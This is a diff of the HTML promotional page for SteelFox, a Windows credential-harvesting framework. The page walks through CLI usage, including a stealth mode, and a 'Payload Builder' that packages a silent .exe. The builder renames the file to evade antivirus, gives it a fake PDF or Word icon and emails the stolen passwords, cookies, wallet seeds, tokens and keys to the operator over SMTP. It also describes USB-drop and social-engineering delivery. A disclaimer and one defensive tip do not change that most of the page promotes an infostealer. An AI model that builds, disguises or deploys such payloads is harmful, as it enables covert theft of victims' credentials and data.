-        <p class="font-mono text-sm text-zinc-400 leading-relaxed">Once installed, every operation is driven by a single command. Target specific categories, control verbosity, choose your output format.</p>
-        <div class="codebox p-6 text-xs space-y-1">
-          <div><span class="c"># Full scan, HTML report</span></div>
-          <div>steelfox all -oH</div>
-          <div class="pt-2"><span class="c"># Specific category only</span></div>
-          <div>steelfox browsers</div>
-          <div>steelfox reconnaissance</div>
-          <div>steelfox windows</div>
-          <div class="pt-2"><span class="c"># Output to folder, all formats</span></div>
-          <div>steelfox all -oA -output .\loot</div>
-          <div class="pt-2"><span class="c"># Silent — no console, stealth mode</span></div>
-          <div>steelfox all --stealth -oH</div>
-          <div class="pt-2"><span class="c"># Supply master password</span></div>
-          <div>steelfox all --password "MyKeePass"</div>
-        </div>
-        <!-- CLI flags table -->
-        <div class="border border-zinc-900 divide-y divide-zinc-900 text-xs font-mono">
-          <div class="grid grid-cols-2 px-4 py-2 bg-zinc-950 text-zinc-600 uppercase tracking-widest text-[10px]"><span>Flag</span><span>Effect</span></div>
-          <div class="grid grid-cols-2 px-4 py-2"><span class="text-zinc-300">-oH</span><span class="text-zinc-500">HTML dark dashboard</span></div>
-          <div class="grid grid-cols-2 px-4 py-2"><span class="text-zinc-300">-oJ</span><span class="text-zinc-500">JSON structured output</span></div>
-          <div class="grid grid-cols-2 px-4 py-2"><span class="text-zinc-300">-oN</span><span class="text-zinc-500">Plaintext TXT report</span></div>
-          <div class="grid grid-cols-2 px-4 py-2"><span class="text-zinc-300">-oA</span><span class="text-zinc-500">All 3 formats at once</span></div>
-          <div class="grid grid-cols-2 px-4 py-2"><span class="text-zinc-300">-q</span><span class="text-zinc-500">Quiet (no banner)</span></div>
-          <div class="grid grid-cols-2 px-4 py-2"><span class="text-zinc-300">--stealth</span><span class="text-zinc-500">No console window</span></div>
-          <div class="grid grid-cols-2 px-4 py-2"><span class="text-zinc-300">-v / -vv</span><span class="text-zinc-500">Verbose / debug</span></div>
-          <div class="grid grid-cols-2 px-4 py-2"><span class="text-zinc-300">--list-modules</span><span class="text-zinc-500">List all modules</span></div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- ══════════════════ BUILDER ══════════════════ -->
-<section id="builder" class="py-28 border-b border-zinc-900">
-  <div class="max-w-7xl mx-auto px-6">
-    <p class="section-label mb-4">Payload Builder</p>
-    <h2 class="text-4xl font-black uppercase tracking-tighter mb-4">Forge Your Payload</h2>
-    <p class="font-mono text-sm text-zinc-500 mb-16 max-w-2xl">The Builder packages the entire SteelFox engine into a self-contained .exe with embedded email reporting. No Python on the target. Drop it, run it, receive the loot.</p>
-
-    <div class="grid grid-cols-1 lg:grid-cols-2 gap-16 items-start mb-20">
-      <div>
-        <h3 class="text-2xl font-bold mb-6">How It Works</h3>
-        <div class="space-y-4 font-mono text-sm text-zinc-400">
-          <div class="flex gap-4 items-start p-4 border border-zinc-900"><span class="text-white font-bold text-xl mr-2">1.</span><div><p class="text-white mb-1">Provide SMTP credentials</p><p class="text-zinc-500 text-xs">Your Gmail sender address + App Password (16-char code, not your Gmail password) and a recipient email.</p></div></div>
-          <div class="flex gap-4 items-start p-4 border border-zinc-900"><span class="text-white font-bold text-xl mr-2">2.</span><div><p class="text-white mb-1">Builder compiles the payload</p><p class="text-zinc-500 text-xs">PyInstaller packages the engine + your encrypted SMTP config into a single .exe. The package gets renamed for AV evasion.</p></div></div>
-          <div class="flex gap-4 items-start p-4 border border-zinc-900"><span class="text-white font-bold text-xl mr-2">3.</span><div><p class="text-white mb-1">Target executes the file</p><p class="text-zinc-500 text-xs">No window, no console. Runs in background. Sweeps all credentials. Generates HTML report.</p></div></div>
-          <div class="flex gap-4 items-start p-4 border border-zinc-900"><span class="text-white font-bold text-xl mr-2">4.</span><div><p class="text-white mb-1">Report lands in your inbox</p><p class="text-zinc-500 text-xs">The full HTML dashboard is emailed to your target address automatically via SMTP/TLS. A local cache is also saved to %TEMP%.</p></div></div>
-        </div>
-      </div>
-      <div>
-        <div class="shot-wrap border border-zinc-800 mb-6">
-          <img src="asset_site/screen-shoot.png" alt="SteelFox Builder GUI" class="w-full block">
-          <div class="shot-cap"><span class="font-mono text-xs text-white">SteelFox Builder GUI — Windows only.</span></div>
-        </div>
-        <div class="grid grid-cols-2 gap-4">
-          <div class="card p-5 flex flex-col gap-2">
-            <span class="font-mono text-[10px] text-zinc-600 uppercase tracking-widest">builder.py</span>
-            <span class="text-sm font-bold">GUI (Tkinter)</span>
-            <span class="font-mono text-xs text-zinc-500">Windows only. Visual form. Easiest for non-CLI users.</span>
-          </div>
-          <div class="card p-5 flex flex-col gap-2">
-            <span class="font-mono text-[10px] text-zinc-600 uppercase tracking-widest">builder_cli.py</span>
-            <span class="text-sm font-bold">Headless CLI</span>
-            <span class="font-mono text-xs text-zinc-500">Windows, Linux (via Wine) or CI. No GUI needed.</span>
-          </div>
-        </div>
-        <div class="mt-6 codebox p-5 text-xs">
-          <span class="c"># Headless CLI builder</span><br>
-          python builder_cli.py \<br>
-          &nbsp;&nbsp;--receiver you@gmail.com \<br>
-          &nbsp;&nbsp;--sender&nbsp;&nbsp; you@gmail.com \<br>
-          &nbsp;&nbsp;--password "abcd efgh ijkl mnop" \<br>
-          &nbsp;&nbsp;--name&nbsp;&nbsp;&nbsp;&nbsp; SysHealthCheck \<br>
-          &nbsp;&nbsp;--output&nbsp;&nbsp; ./dist
-        </div>
-      </div>
-    </div>
-
-    <!-- Deployment vectors -->
-    <h3 class="text-2xl font-black uppercase tracking-tighter mb-8">Deployment Vectors</h3>
-    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-      <div class="card overflow-hidden">
-        <div class="h-56 overflow-hidden border-b border-zinc-900">
-          <img src="asset_site/usb-acces-image-of-usb-key-on-computer.png" class="w-full h-full object-cover grayscale hover:grayscale-0 hover:scale-105 transition duration-700">
-        </div>
-        <div class="p-8">
-          <h4 class="font-bold text-xl mb-3 uppercase tracking-wide">Physical Drop (USB)</h4>
-          <p class="font-mono text-xs text-zinc-500 leading-relaxed">Physical access to an unlocked machine. Plugin the USB stick, execute the payload. SteelFox sweeps the system in under 60 seconds and drops the HTML report back on the USB. No traces. You walk away with the credentials.</p>
-        </div>
-      </div>
-      <div class="card overflow-hidden">
-        <div class="h-56 bg-zinc-950 flex items-center justify-center border-b border-zinc-900 p-10">
-          <img src="asset_site/example-of-executable-file-named-homework-and-hav-pdf-icon.png" class="max-h-full drop-shadow-2xl">
-        </div>
-        <div class="p-8">
-          <h4 class="font-bold text-xl mb-3 uppercase tracking-wide">Remote / Social Engineering</h4>
-          <p class="font-mono text-xs text-zinc-500 leading-relaxed">Deliver the payload remotely. The builder lets you set a custom icon (word doc, PDF…). When run by the target, it operates silently, exfiltrates all data, and sends the full HTML report to your inbox via SMTP. Zero interaction required after drop.</p>
-        </div>
-      </div>
-    </div>
-    <div class="mt-8 p-6 border border-yellow-900/40 bg-yellow-900/10">
-      <h4 class="font-mono text-yellow-400 text-sm uppercase tracking-widest mb-3">🛡 Blue Team — Defensive Advice</h4>
-      <p class="font-mono text-xs text-zinc-400 leading-relaxed">
-        Windows hides file extensions by default. A malicious <code class="text-white">invoice.pdf.exe</code> with a PDF icon appears as <code class="text-white">invoice.pdf</code>. <strong>Enable "Show file name extensions"</strong> in Windows Explorer to see the true extension of every file. This simple setting prevents the vast majority of icon-spoofing attacks.
-      </p>
-    </div>
-
-    <!-- Linux builders -->
-    <div class="mt-12">
-      <h3 class="text-xl font-bold mb-6 uppercase tracking-tight">Building on Linux</h3>
-      <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-        <div class="card p-8">
-          <div class="font-mono text-[10px] text-zinc-600 uppercase tracking-widest mb-3">Option 1 — Wine (Local)</div>
-          <h4 class="font-bold mb-4">Wine + Windows Python</h4>
-          <div class="codebox p-4 text-xs">
-            sudo apt install wine<br><br>
-            <span class="c"># Download python-3.11-amd64.exe then:</span><br>
-            wine python-3.11.exe /quiet<br>
-            wine python -m pip install pyinstaller<br>
-            wine python -m pip install -r requirements.txt<br><br>
-            wine python builder_cli.py \<br>
-            &nbsp;&nbsp;--receiver you@gmail.com \<br>
-            &nbsp;&nbsp;--password "APP_PASS" \<br>
-            &nbsp;&nbsp;--name SysHealthCheck
-          </div>
-        </div>
-        <div class="card p-8">
-          <div class="font-mono text-[10px] text-zinc-600 uppercase tracking-widest mb-3">Option 2 — GitHub Actions (Remote)</div>
-          <h4 class="font-bold mb-4">Automated CI/CD Pipeline</h4>
-          <p class="font-mono text-xs text-zinc-500 leading-relaxed mb-4">Tag a release, push. GitHub Actions spins a Windows runner, compiles the payload, and stores the .exe as a build artifact. Set SF_RECEIVER, SF_SENDER, SF_PASSWORD as GitHub Secrets to auto-build a configured payload too.</p>
-          <div class="codebox p-4 text-xs">
-            git tag -a v1.3.1 -m "Release"<br>
-            git push origin v1.3.1
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- ══════════════════ REPORTS ══════════════════ -->
-<section id="reports" class="py-28 border-b border-zinc-900 bg-zinc-950">
-  <div class="max-w-7xl mx-auto px-6">
-    <p class="section-label mb-4">Output & Reports</p>
-    <h2 class="text-4xl font-black uppercase tracking-tighter mb-4">Intelligence, Beautifully Served</h2>
-    <p class="font-mono text-sm text-zinc-500 mb-14 max-w-2xl">SteelFox generates self-contained reports. The HTML dashboard works fully offline in any browser, with interactive search, masked fields, and click-to-reveal passwords.</p>
-    <div class="grid grid-cols-1 gap-8">
-      <div class="shot-wrap border border-zinc-800">
-        <img src="asset_site/screen-shoot-steel-fox-html-report.png" alt="SteelFox Report Overview" class="w-full block">
-        <div class="shot-cap">
-          <p class="font-bold text-white mb-1">Dashboard Overview</p>
-          <p class="font-mono text-xs text-zinc-400">Hostname, scan date, KPI cards (credentials found / categories scanned / users targeted). Sidebar navigation with result counts per category.</p>
-        </div>
-      </div>
-      <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-        <div class="shot-wrap border border-zinc-800">
-          <img src="asset_site/screen-shoot-steel-fox-html-report-2-Chrome.png" alt="Chrome Credentials" class="w-full block">
-          <div class="shot-cap">
-            <p class="font-bold text-white mb-1">Browser Credentials — 1314 items</p>
-            <p class="font-mono text-xs text-zinc-400">Each card shows source, field name, masked value, usage count. Clean 4-column grid.</p>
-          </div>
-        </div>
-        <div class="shot-wrap border border-zinc-800">
-          <img src="asset_site/screen-shoot-steel-fox-html-report-3-wifi-and-search.png" alt="WiFi & Search" class="w-full block">
-          <div class="shot-cap">
-            <p class="font-bold text-white mb-1">WiFi Networks + Global Search</p>
-            <p class="font-mono text-xs text-zinc-400">SSID, cleartext password, auth type. Sidebar search filters instantly across all modules.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-    <!-- Output format table -->
-    <div class="mt-10 border border-zinc-900 divide-y divide-zinc-900 text-sm font-mono">
-      <div class="grid grid-cols-3 px-6 py-3 bg-zinc-950 text-zinc-600 uppercase tracking-widest text-xs"><span>Format</span><span>Flag</span><span>Description</span></div>
-      <div class="grid grid-cols-3 px-6 py-4"><span class="text-white">HTML</span><span class="text-zinc-400">-oH</span><span class="text-zinc-500">Dark dashboard, search, click-to-reveal, offline-capable single file</span></div>
-      <div class="grid grid-cols-3 px-6 py-4"><span class="text-white">JSON</span><span class="text-zinc-400">-oJ</span><span class="text-zinc-500">Structured, machine-readable, ideal for automation and piping</span></div>
-      <div class="grid grid-cols-3 px-6 py-4"><span class="text-white">TXT</span><span class="text-zinc-400">-oN</span><span class="text-zinc-500">Plaintext operator-friendly dump for quick review</span></div>
-      <div class="grid grid-cols-3 px-6 py-4"><span class="text-white">All</span><span class="text-zinc-400">-oA</span><span class="text-zinc-500">Generates all 3 formats simultaneously</span></div>
-    </div>
-  </div>
-</section>
-
-<!-- ══════════════════ OPEN SOURCE / AUTHOR ══════════════════ -->
-<section class="py-28 border-b border-zinc-900">
-  <div class="max-w-7xl mx-auto px-6 grid grid-cols-1 lg:grid-cols-2 gap-20 items-center">
-    <div>
-      <p class="section-label mb-4">Open Source Community</p>
-      <h2 class="text-4xl font-black uppercase tracking-tighter mb-8">Built in the Open. Improved Together.</h2>
-      <div class="space-y-5 font-mono text-sm text-zinc-400 leading-relaxed">
-        <p>SteelFox is <span class="text-white">fully open source</span> under the LGPL-3.0 license. The entire framework — from the extraction engine to the HTML report generator — is available on GitHub.</p>
-        <p>The module architecture is intentionally simple to extend. Drop a <code class="text-zinc-200">.py</code> file in the right category folder, inherit from <code class="text-zinc-200">ModuleBase</code>, implement <code class="text-zinc-200">run()</code> — and the framework auto-discovers and loads it. Zero registration, zero configuration.</p>
-      </div>
-      <div class="mt-8 codebox p-6 text-xs">
-        <span class="c"># Adding a new module is this simple:</span><br><br>
-        from steelfox.core.module_base import (<br>
-        &nbsp;&nbsp;Category, ModuleBase, ModuleMeta<br>
-        )<br><br>
-        class MyNewModule(ModuleBase):<br>
-        &nbsp;&nbsp;meta = ModuleMeta(<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;name="My Module",<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;category=Category.BROWSERS,<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;description="Recovers creds from X",<br>
-        &nbsp;&nbsp;)<br><br>
-        &nbsp;&nbsp;def run(self) -&gt; list[dict]:<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;# your logic here<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;return results
-      </div>
-      <div class="flex gap-4 mt-8">
-        <a href="https://github.com/Tiger-Foxx/fox-steel" target="_blank" class="btn btn-white">
-          <img src="https://cdn.simpleicons.org/github/000000" class="w-4 h-4"> Star on GitHub
-        </a>
-        <a href="https://github.com/Tiger-Foxx/fox-steel/issues" target="_blank" class="btn btn-outline">Open an Issue</a>
-      </div>
-    </div>
-    <!-- Author card -->
-    <div class="card p-10 flex flex-col items-center text-center">
-      <img src="https://avatars.githubusercontent.com/u/118616410?v=4" class="w-28 h-28 rounded-full border-2 border-zinc-700 mb-6" alt="Tiger-Foxx">
-      <h3 class="text-2xl font-bold mb-1">Fox</h3>
-      <a href="https://github.com/Tiger-Foxx" target="_blank" class="font-mono text-sm text-zinc-500 hover:text-white transition mb-6">@Tiger-Foxx</a>
-      <p class="font-mono text-xs text-zinc-500 leading-relaxed mb-8 max-w-sm">passionate about security, developer, and hacking enthusiast. SteelFox is one of many tools built with precision and passion for the cybersecurity community.</p>
-      <div class="grid grid-cols-2 gap-4 w-full text-xs font-mono">
-        <div class="p-4 bg-zinc-950 border border-zinc-900 text-center"><p class="text-white font-bold text-2xl">v1.3.1</p><p class="text-zinc-600 mt-1">Current version</p></div>
-        <div class="p-4 bg-zinc-950 border border-zinc-900 text-center"><p class="text-white font-bold text-2xl">LGPL</p><p class="text-zinc-600 mt-1">License</p></div>
-      </div>
-      <a href="https://github.com/Tiger-Foxx" target="_blank" class="btn btn-outline mt-6 w-full justify-center">View GitHub Profile</a>
-    </div>
-  </div>
-</section>
-
-<!-- ══════════════════ DISCLAIMER ══════════════════ -->
-<section id="disclaimer" class="py-28">
-  <div class="max-w-5xl mx-auto px-6">
-    <div class="border border-red-900/50 bg-red-950/10 p-10 lg:p-16">
-      <div class="flex items-start gap-6 mb-8">
-        <svg class="w-12 h-12 text-red-500 shrink-0 mt-1" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="square" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z"/></svg>
+    <!-- ══════════════════ HERO ══════════════════ -->
+    <section
+      class="min-h-screen pt-24 flex items-center relative overflow-hidden"
+      style="
+        background: radial-gradient(
+          ellipse 80% 50% at 60% 60%,
+          rgba(255, 255, 255, 0.04) 0%,
+          transparent 70%
+        );
+      "
+    >
+      <!-- Subtle dot grid -->
+      <div
+        class="absolute inset-0 opacity-20"
+        style="
+          background-image: radial-gradient(circle, #333 1px, transparent 1px);
+          background-size: 32px 32px;
+        "
+      ></div>
+      <div
+        class="relative max-w-7xl mx-auto px-6 grid grid-cols-1 lg:grid-cols-2 gap-12 items-center py-20"
+      >
         <div>
-          <h2 class="text-3xl font-black uppercase tracking-tighter mb-2">Legal Disclaimer</h2>
-          <p class="font-mono text-sm text-red-400 tracking-wide">Read before you use.</p>
+          <h1
+            class="text-6xl sm:text-7xl lg:text-8xl font-black uppercase tracking-tighter leading-[.85] mb-8"
+          >
+            STEEL<br /><span
+              style="-webkit-text-stroke: 1px #fff; color: transparent"
+              >FOX</span
+            >
+          </h1>
+          <p
+            class="font-mono text-sm text-zinc-400 border-l border-zinc-700 pl-5 mb-10 max-w-lg leading-relaxed"
+          >
+            A ruthless, elegant credential recovery and system reconnaissance
+            framework for Windows. 112 modules, zero noise, total visibility.
+          </p>
+          <div class="flex flex-wrap gap-4">
+            <a
+              href="https://github.com/Tiger-Foxx/fox-steel/releases"
+              target="_blank"
+              class="btn btn-white"
+            >
+              <svg
+                class="w-4 h-4"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                viewBox="0 0 24 24"
+              >
+                <path
+                  stroke-linecap="square"
+                  d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5 5-5M12 3v12"
+                />
+              </svg>
+              Download for Windows
+            </a>
+            <a
+              href="https://github.com/Tiger-Foxx/fox-steel"
+              target="_blank"
+              class="btn btn-outline"
+            >
+              <img
+                src="https://cdn.simpleicons.org/github/ffffff"
+                class="w-4 h-4"
+              />
+              Source Code
+            </a>
+          </div>
+          <p class="font-mono text-[11px] text-zinc-700 mt-5">
+            *Authorized security auditing purposes only. See Legal section.
+          </p>
+        </div>
+        <div class="flex justify-center lg:justify-end relative">
+          <div
+            class="absolute inset-0 blur-[90px] rounded-full"
+            style="
+              background: radial-gradient(
+                ellipse,
+                rgba(255, 255, 255, 0.06),
+                transparent 70%
+              );
+            "
+          ></div>
+          <img
+            src="asset_site/image-steel-fox.png"
+            class="relative w-full max-w-[460px] drop-shadow-2xl hover:scale-105 transition duration-700"
+            alt="SteelFox"
+          />
         </div>
       </div>
-      <div class="space-y-5 font-mono text-sm text-zinc-400 leading-relaxed">
-        <p class="text-white border-l-2 border-red-500 pl-5 py-1">SteelFox is designed strictly for <strong>educational, academic research, and authorized security auditing purposes only.</strong></p>
-        <p>Deploying this framework against any system, network, or infrastructure <strong>without explicit, prior written permission</strong> from the owner is illegal in most jurisdictions worldwide — including but not limited to offenses under the US Computer Fraud and Abuse Act, the EU Directive on Attacks Against Information Systems, and equivalent local legislation.</p>
-        <p>You, and solely you, are responsible for any and all actions taken using this software. The author and all contributors assume zero liability for misuse, damage, or legal consequences arising from unauthorized deployment.</p>
-        <p><strong class="text-white">Antivirus Detection:</strong> Because SteelFox interfaces deeply with Windows security APIs (DPAPI, SAM, Credential Manager, raw Win32), EDR platforms and traditional AV solutions will flag generated executables. This is standard, expected behavior for security auditing tools. Always run in a controlled, excluded environment during authorized engagements.</p>
-        <p class="text-center pt-5 border-t border-red-900/30 text-zinc-600">
-          <code>// Don't be that guy. With great code comes great responsibility.</code>
-        </p>
+    </section>
+
+    <!-- ══════════════════ MARQUEE ══════════════════ -->
+    <div class="border-y border-zinc-900 bg-zinc-950 py-4 overflow-hidden">
+      <div
+        class="marquee-track font-mono text-xs tracking-[.25em] text-zinc-600 uppercase select-none"
+      >
+        <span class="mx-8">112 Modules</span>•<span class="mx-8"
+          >DPAPI Decryption</span
+        >•<span class="mx-8">Stealth Mode</span>•<span class="mx-8"
+          >Chromium AES-GCM</span
+        >•<span class="mx-8">Firefox NSS Vaults</span>•<span class="mx-8"
+          >Payload Builder</span
+        >•<span class="mx-8">SMTP Exfiltration</span>•<span class="mx-8"
+          >HTML Reports</span
+        >•<span class="mx-8">Multi-User Scan</span>•<span class="mx-8"
+          >pip install</span
+        >• <span class="mx-8">112 Modules</span>•<span class="mx-8"
+          >DPAPI Decryption</span
+        >•<span class="mx-8">Stealth Mode</span>•<span class="mx-8"
+          >Chromium AES-GCM</span
+        >•<span class="mx-8">Firefox NSS Vaults</span>•<span class="mx-8"
+          >Payload Builder</span
+        >•<span class="mx-8">SMTP Exfiltration</span>•<span class="mx-8"
+          >HTML Reports</span
+        >•<span class="mx-8">Multi-User Scan</span>•<span class="mx-8"
+          >pip install</span
+        >•
       </div>
     </div>
-  </div>
-</section>
 
-<!-- ══════════════════ FOOTER ══════════════════ -->
-<footer class="border-t border-zinc-900 bg-black py-10">
-  <div class="max-w-7xl mx-auto px-6 flex flex-col md:flex-row justify-between items-center gap-6 font-mono text-xs text-zinc-600 uppercase tracking-widest">
-    <div class="flex items-center gap-3">
-      <img src="asset_site/logo-steel-fox-white-1.png" class="h-5 opacity-40">
-      <span>SteelFox © 2026 Tiger-Foxx. LGPL-3.0.</span>
-    </div>
-    <div class="flex items-center gap-6">
-      <a href="https://github.com/Tiger-Foxx/fox-steel" target="_blank" class="hover:text-white transition">Source</a>
-      <a href="https://github.com/Tiger-Foxx/fox-steel/releases" target="_blank" class="hover:text-white transition">Releases</a>
-      <a href="https://github.com/Tiger-Foxx/fox-steel/blob/main/CHANGELOG.md" target="_blank" class="hover:text-white transition">Changelog</a>
-      <a href="#disclaimer" class="hover:text-red-400 transition">Legal</a>
-    </div>
-  </div>
-</footer>
+    <!-- ══════════════════ ABOUT ══════════════════ -->
+    <section id="about" class="py-28 border-b border-zinc-900">
+      <div class="max-w-7xl mx-auto px-6">
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-20 items-start">
+          <div>
+            <p class="section-label mb-4">What is SteelFox?</p>
+            <h2
+              class="text-4xl lg:text-5xl font-black uppercase tracking-tighter mb-8"
+            >
+              Know Your Machine. Every Secret. Every Credential.
+            </h2>
+            <div
+              class="space-y-5 font-mono text-sm text-zinc-400 leading-relaxed"
+            >
+              <p>
+                SteelFox is a
+                <span class="text-white"
+                  >modern, research-grade credential recovery and system
+                  reconnaissance framework</span
+                >
+                built in Python 3.10+ for Windows systems. It gives security
+                professionals and researchers a structured, repeatable way to
+                audit what credentials, tokens, and sensitive data are stored —
+                and potentially exposed — on a Windows machine.
+              </p>
+              <p>
+                Think of it as an ultra-precise sweep of everything Windows
+                keeps around that it probably shouldn't: browser passwords and
+                cookies, saved WiFi keys, cryptocurrency wallet seeds, SSH keys,
+                cloud CLI tokens, VPN credentials, messaging session files, and
+                much more.
+              </p>
+              <p>
+                Whether you run it directly from the command line on a machine
+                you control, or use the
+                <span class="text-white">Payload Builder</span> to generate a
+                silent standalone <code class="text-zinc-300">.exe</code> for
+                remote or physical audit scenarios — SteelFox delivers clean,
+                structured intelligence wrapped in a beautiful dark-themed HTML
+                dashboard.
+              </p>
+              <p>
+                The project is
+                <span class="text-white">100% open source</span> (LGPL-3.0) and
+                accepts community contributions. Drop a module file in the right
+                directory, it gets auto-discovered. No registration, no
+                ceremony.
+              </p>
+            </div>
+          </div>
+          <!-- Stats -->
+          <div
+            class="grid grid-cols-2 gap-px bg-zinc-900 border border-zinc-900"
+          >
+            <div class="bg-black p-8">
+              <p class="font-mono text-5xl font-bold text-white mb-2">112</p>
+              <p
+                class="font-mono text-xs text-zinc-500 uppercase tracking-widest"
+              >
+                Extraction Modules
+              </p>
+            </div>
+            <div class="bg-black p-8">
+              <p class="font-mono text-5xl font-bold text-white mb-2">12</p>
+              <p
+                class="font-mono text-xs text-zinc-500 uppercase tracking-widest"
+              >
+                Target Categories
+              </p>
+            </div>
+            <div class="bg-black p-8">
+              <p class="font-mono text-5xl font-bold text-white mb-2">3</p>
+              <p
+                class="font-mono text-xs text-zinc-500 uppercase tracking-widest"
+              >
+                Report Formats
+              </p>
+            </div>
+            <div class="bg-black p-8">
+              <p class="font-mono text-5xl font-bold text-white mb-2">1.0</p>
+              <p
+                class="font-mono text-xs text-zinc-500 uppercase tracking-widest"
+              >
+                Silent EXE payload
+              </p>
+            </div>
+            <div class="col-span-2 bg-black p-8 border-t border-zinc-900">
+              <p
+                class="font-mono text-xs text-zinc-500 uppercase tracking-widest mb-3"
+              >
+                Use Cases
+              </p>
+              <div
+                class="grid grid-cols-2 gap-2 font-mono text-xs text-zinc-300"
+              >
+                <span>Penetration Testing</span>
+                <span>Academic Research</span>
+                <span>Internal Audits</span>
+                <span>Security Labs</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
 
-</body>
+    <!-- ══════════════════ COVERAGE ══════════════════ -->
+    <section id="coverage" class="py-28 border-b border-zinc-900 bg-zinc-950">
+      <div class="max-w-7xl mx-auto px-6">
+        <p class="section-label mb-4">Coverage</p>
+        <h2 class="text-4xl font-black uppercase tracking-tighter mb-4">
+          What Gets Extracted
+        </h2>
+        <p class="font-mono text-sm text-zinc-500 mb-14 max-w-2xl">
+          SteelFox targets 12 categories with 112 distinct extraction modules
+          running in an auto-discovered plugin architecture. Here's what each
+          category yields.
+        </p>
+        <div
+          class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-px bg-zinc-900 border border-zinc-900"
+        >
+          <!-- Category rows -->
+          <div class="card p-8 text-left">
+            <div class="flex items-center gap-3 mb-4">
+              <img
+                src="https://cdn.simpleicons.org/googlechrome"
+                class="w-7 h-7 ico-color"
+              /><span class="font-bold text-lg">Browsers</span
+              ><span class="ml-auto font-mono text-xs text-zinc-600"
+                >2 modules</span
+              >
+            </div>
+            <p
+              class="font-mono text-xs text-zinc-500 leading-relaxed text-left"
+            >
+              Chromium (AES-GCM + DPAPI v10/v20) passwords, cookies, autofill,
+              credit cards, history, bookmarks. Firefox / Mozilla NSS vault
+              decryption.
+            </p>
+          </div>
+          <div class="card p-8 text-left">
+            <div class="flex items-center gap-3 mb-4">
+              <img
+                src="https://cdn.simpleicons.org/discord"
+                class="w-7 h-7 ico-color"
+              /><span class="font-bold text-lg">Messaging</span
+              ><span class="ml-auto font-mono text-xs text-zinc-600"
+                >8 modules</span
+              >
+            </div>
+            <p
+              class="font-mono text-xs text-zinc-500 leading-relaxed text-left"
+            >
+              Discord, Slack, Microsoft Teams, Signal Desktop, Skype, WhatsApp
+              Desktop, Telegram sessions.
+            </p>
+          </div>
+          <div class="card p-8 text-left">
+            <div class="flex items-center gap-3 mb-4">
+              <img
+                src="https://cdn.simpleicons.org/outlook"
+                class="w-7 h-7 ico-color"
+              /><span class="font-bold text-lg">Mail</span
+              ><span class="ml-auto font-mono text-xs text-zinc-600"
+                >3 modules</span
+              >
+            </div>
+            <p
+              class="font-mono text-xs text-zinc-500 leading-relaxed text-left"
+            >
+              Outlook, Thunderbird, Mailbird — credentials and SMTP/IMAP account
+              configurations.
+            </p>
+          </div>
+          <div class="card p-8 text-left">
+            <div class="flex items-center gap-3 mb-4">
+              <img
+                src="https://cdn.simpleicons.org/steam"
+                class="w-7 h-7 ico-color"
+              /><span class="font-bold text-lg">Gaming & Crypto</span
+              ><span class="ml-auto font-mono text-xs text-zinc-600"
+                >15 modules</span
+              >
+            </div>
+            <p
+              class="font-mono text-xs text-zinc-500 leading-relaxed text-left"
+            >
+              Steam, Epic Games, Battle.net. Exodus, Electrum, MetaMask, Atomic,
+              Bitcoin Core, Ethereum Keystores — wallet seeds and keys.
+            </p>
+          </div>
+          <div class="card p-8 text-left">
+            <div class="flex items-center gap-3 mb-4">
+              <img
+                src="https://cdn.simpleicons.org/amazonaws"
+                class="w-7 h-7 ico-color"
+              /><span class="font-bold text-lg">Cloud</span
+              ><span class="ml-auto font-mono text-xs text-zinc-600"
+                >4 modules</span
+              >
+            </div>
+            <p
+              class="font-mono text-xs text-zinc-500 leading-relaxed text-left"
+            >
+              OneDrive, Google Drive, Dropbox, MEGA — sync credentials and OAuth
+              tokens.
+            </p>
+          </div>
+          <div class="card p-8 text-left">
+            <div class="flex items-center gap-3 mb-4">
+              <img
+                src="https://cdn.simpleicons.org/docker"
+                class="w-7 h-7 ico-color"
+              /><span class="font-bold text-lg">DevTools</span
+              ><span class="ml-auto font-mono text-xs text-zinc-600"
+                >21 modules</span
+              >
+            </div>
+            <p
+              class="font-mono text-xs text-zinc-500 leading-relaxed text-left"
+            >
+              Git, SSH keys, Docker, AWS CLI, Azure CLI, GCP/gcloud, Kubernetes,
+              GitHub CLI, Terraform, VS Code, JetBrains IDEs, Postman, ngrok,
+              HashiCorp Vault…
+            </p>
+          </div>
+          <div class="card p-8 text-left">
+            <div class="flex items-center gap-3 mb-4">
+              <img
+                src="https://cdn.simpleicons.org/mysql"
+                class="w-7 h-7 ico-color"
+              /><span class="font-bold text-lg">Databases</span
+              ><span class="ml-auto font-mono text-xs text-zinc-600"
+                >5 modules</span
+              >
+            </div>
+            <p
+              class="font-mono text-xs text-zinc-500 leading-relaxed text-left"
+            >
+              MySQL Workbench, DBeaver, HeidiSQL, pgAdmin 4, Robo 3T — stored
+              connection profiles with credentials.
+            </p>
+          </div>
+          <div class="card p-8 text-left">
+            <div class="flex items-center gap-3 mb-4">
+              <img
+                src="https://cdn.simpleicons.org/openvpn"
+                class="w-7 h-7 ico-color"
+              /><span class="font-bold text-lg">Network / VPN</span
+              ><span class="ml-auto font-mono text-xs text-zinc-600"
+                >9 modules</span
+              >
+            </div>
+            <p
+              class="font-mono text-xs text-zinc-500 leading-relaxed text-left"
+            >
+              WiFi profiles with cleartext keys, OpenVPN, NordVPN, ProtonVPN,
+              WireGuard, Cisco AnyConnect, FortiClient, GlobalProtect,
+              Tailscale.
+            </p>
+          </div>
+          <div class="card p-8 text-left">
+            <div class="flex items-center gap-3 mb-4">
+              <img
+                src="https://cdn.simpleicons.org/windows11"
+                class="w-7 h-7 ico-color"
